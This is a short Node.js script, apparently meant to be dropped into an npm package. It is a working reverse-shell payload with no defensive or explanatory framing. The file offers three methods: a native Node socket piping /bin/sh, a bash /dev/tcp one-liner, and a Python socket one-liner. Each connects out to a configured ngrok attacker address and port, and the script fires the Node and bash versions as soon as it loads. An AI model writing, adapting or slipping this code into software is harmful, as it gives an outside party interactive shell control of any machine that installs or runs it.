const { exec, spawn } = require('child_process');

const net = require('net');

const os = require('os');


// === CONFIGURE THESE ===

const ATTACKER_IP = '0.tcp.eu.ngrok.io';  // Your IP or ngrok address

const ATTACKER_PORT = 10585;     // Your listening port

// ========================


// Method 1: Node.js native reverse shell

function nodeRevShell() {

    const client = new net.Socket();

    client.connect(ATTACKER_PORT, ATTACKER_IP, () => {

        const sh = spawn('/bin/sh', []);

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    client.on('error', () => {});

}


// Method 2: Bash reverse shell (if available)

function bashRevShell() {

    exec(`bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1`);

}


// Method 3: Python reverse shell (fallback)

function pythonRevShell() {

    const cmd = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ATTACKER_IP}",${ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;

    exec(cmd);

}


// Try Node.js method first (most reliable in npm context)

nodeRevShell();

bashRevShell();
